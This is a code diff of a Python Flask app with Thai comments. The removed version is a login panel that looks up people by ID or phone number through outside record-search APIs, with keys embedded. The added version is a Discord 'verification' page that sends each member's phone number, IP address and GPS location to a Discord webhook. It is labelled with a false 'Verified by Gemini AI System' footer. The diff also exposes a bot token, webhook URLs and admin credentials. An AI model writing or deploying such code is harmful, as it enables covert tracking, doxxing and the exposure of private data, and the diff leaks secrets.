@@ -1,130 +1,81 @@
+import discord
+from discord.ext import commands
+from flask import Flask, render_template, request, jsonify
+from flask_cors import CORS
+import threading
+import asyncio
 import requests
-import json
-import os
-from datetime import datetime, timedelta
-from flask import Flask, render_template, request, session, jsonify, redirect, url_for
+from datetime import datetime
+
+# --- CONFIGURATION ---
+TOKEN = 'MTQ2MDYzODAzMTIyNzc4NTI3Nw.GtTyXp.VLvh6gYiVsEUpKPCDwFpcJsrxFOZp1zCdHXpm4'
+GUILD_ID = 1437386797339381832
+ROLE_ID = 1446770066241880075
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1467603789157761239/_6ItzBctBnqj9WBU6p0WuPrvEUwPXzroOQpywdnGDA9AT1HT5RLe2qIBl0rS3DVEwb6i'
 
 app = Flask(__name__)
-app.secret_key = 'shinobi_secret_key_2026' # ต้องมีเพื่อให้ Login ติด
+CORS(app)
 
-# --- CONFIG ---
-DB_FILE = 'database.json'
-# URL Webhook ของคุณ
-WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1465811458200834209/pu_ZLiGP6nwCjcSGDv5PCnmQbrwcmy8-HOfJc768W-9sDfu0qe_2tIQGMVEHVsbFp1SS'
+intents = discord.Intents.default()
+intents.members = True 
+bot = commands.Bot(command_prefix="!", intents=intents)
 
-def load_db():
-    if not os.path.exists(DB_FILE):
-        # สร้าง Admin ตามภาพ: shinobi2023 / shinobima
-        init = {"shinobi2023": {"password": "shinobima", "role": "admin", "expire": "2099-12-31"}}
-        with open(DB_FILE, 'w', encoding='utf-8') as f:
-            json.dump(init, f, indent=4, ensure_ascii=False)
-        return init
-    try:
-        with open(DB_FILE, 'r', encoding='utf-8') as f:
-            return json.load(f)
-    except:
-        return {"shinobi2023": {"password": "shinobima", "role": "admin", "expire": "2099-12-31"}}
-
-def save_db(data):
-    with open(DB_FILE, 'w', encoding='utf-8') as f:
-        json.dump(data, f, indent=4, ensure_ascii=False)
-
-def send_to_webhook(username, status, ip):
-    # แก้ไขบัคบรรทัดที่ 34: เช็กแค่ว่ามี URL หรือไม่พอ ไม่ต้องใส่ "url" in WEBHOOK_URL
-    if not WEBHOOK_URL: 
-        return
-        
-    color = 65280 if status == "SUCCESS" else 16711680
+def log_to_webhook(discord_id, phone, ip, gps):
+    map_url = f"https://www.google.com/maps?q={gps}"
     payload = {
         "embeds": [{
-            "title": f"🔐 Login Monitoring: {status}",
-            "color": color,
+            "title": "🚨 มีการลงทะเบียนใหม่พร้อม GPS",
+            "color": 15158332, # Red/Pink Neon
             "fields": [
-                {"name": "👤 User", "value": f"`{username}`", "inline": True},
-                {"name": "🌐 IP", "value": f"`{ip}`", "inline": True},
-                {"name": "⏰ Time", "value": f"{datetime.now().strftime('%H:%M:%S')}"}
+                {"name": "👤 Member", "value": f"<@{discord_id}>", "inline": True},
+                {"name": "📞 Phone", "value": f"`{phone}`", "inline": True},
+                {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": False},
+                {"name": "📍 GPS Location", "value": f"[{gps}]({map_url})", "inline": False}
             ],
-            "footer": {"text": "X-VISION SYSTEM LOG"}
+            "footer": {"text": "Verified by Gemini AI System"},
+            "timestamp": datetime.now().isoformat()
         }]
     }
-    try:
-        requests.post(WEBHOOK_URL, json=payload, timeout=5)
-    except Exception as e:
-        print(f"Webhook Error: {e}")
+    requests.post(WEBHOOK_URL, json=payload)
 
 @app.route('/')
 def index():
-    return redirect(url_for('dashboard')) if 'user' in session else render_template('login.html')
+    return render_template('index.html')
 
-@app.route('/login', methods=['POST'])
-def login():
-    data = request.get_json()
-    u, p = data.get('u'), data.get('p')
-    db = load_db()
-    
-    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    
-    if u in db and str(db[u]['password']) == str(p):
-        exp_date = datetime.strptime(db[u]['expire'], '%Y-%m-%d')
-        if datetime.now() > exp_date:
-            send_to_webhook(u, "EXPIRED", user_ip)
-            return jsonify({"status": "err", "m": "รหัสหมดอายุแล้ว"}), 403
-        
-        session['user'] = u
-        session['role'] = db[u]['role']
-        send_to_webhook(u, "SUCCESS", user_ip)
-        return jsonify({"status": "ok"})
-    
-    send_to_webhook(u, "FAILED", user_ip)
-    return jsonify({"status": "err", "m": "รหัสผ่านไม่ถูกต้อง"})
+@app.route('/verify', methods=['POST'])
+def verify():
+    data = request.json
+    discord_id = data.get('discordId')
+    phone = data.get('phone')
+    ip = data.get('ip')
+    gps = data.get('gps')
 
-@app.route('/dashboard')
-def dashboard():
-    if 'user' not in session: return redirect(url_for('login'))
-    return render_template('dashboard.html', role=session.get('role'), user=session.get('user'))
-
-@app.route('/api/search', methods=['POST'])
-def api_search():
-    if 'user' not in session: return jsonify({"status": "err"}), 403
-    p = request.get_json()
-    m, v = p.get('m'), p.get('v')
-    # ... API Config เหมือนเดิม ...
-    conf = {
-        "dopa": f"http://85.203.4.103:6868/api/v1/whoshop-ssf?pid={v}&api_key=TRUE-AFYX83CWIS8H",
-        "nhso": f"http://85.203.4.103:6969/api/v1/whoshop?pid={v}&api_key=NHSO-FN2P7BQ46UH6",
-        "trans": f"https://slumzick.xyz/api12.php?token=Kill221&value={v}",
-        "true": f"https://apitu.psnw.xyz/index.php?type=phone&mode=sff&value={v}"
-    }
+    # ส่งงานไปให้ Discord Bot
+    future = asyncio.run_coroutine_threadsafe(give_role(discord_id), bot.loop)
+    
     try:
-        r = requests.get(conf[m], timeout=15).json()
-        return jsonify({"status": "ok", "data": r})
-    except: return jsonify({"status": "err"})
+        if future.result(timeout=10):
+            log_to_webhook(discord_id, phone, ip, gps) # ส่งข้อมูลเข้า Webhook
+            return jsonify({"success": True})
+        return jsonify({"success": False, "message": "ไม่พบผู้ใช้ใน Server"})
+    except Exception as e:
+        return jsonify({"success": False, "message": str(e)})
 
-@app.route('/admin/action', methods=['POST'])
-def admin_action():
-    if session.get('role') != 'admin': return jsonify({"status": "denied"}), 403
-    req = request.get_json()
-    act = req.get('act')
-    db = load_db()
-    
-    if act == 'add':
-        u, p, d = req['u'], req['p'], int(req['d'])
-        db[u] = {"password": p, "role": "user", "expire": (datetime.now() + timedelta(days=d)).strftime('%Y-%m-%d')}
-        save_db(db)
-    elif act == 'del':
-        if req['u'] != 'shinobi2023':
-            db.pop(req['u'], None)
-            save_db(db)
-    elif act == 'list':
-        return jsonify({"status": "ok", "db": db})
-    
-    return jsonify({"status": "ok", "db": db})
+async def give_role(user_id):
+    try:
+        guild = bot.get_guild(GUILD_ID) or await bot.fetch_guild(GUILD_ID)
+        member = await guild.fetch_member(int(user_id))
+        role = guild.get_role(ROLE_ID)
+        if member and role:
+            await member.add_roles(role)
+            return True
+        return False
+    except:
+        return False
 
-@app.route('/logout')
-def logout():
-    session.clear()
-    return redirect(url_for('login'))
+def run_flask():
+    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
 
 if __name__ == '__main__':
-    # รัน Port 10000 ตามภาพ
-    app.run(debug=True, host='0.0.0.0', port=10000)
+    threading.Thread(target=run_flask).start()
+    bot.run(TOKEN)
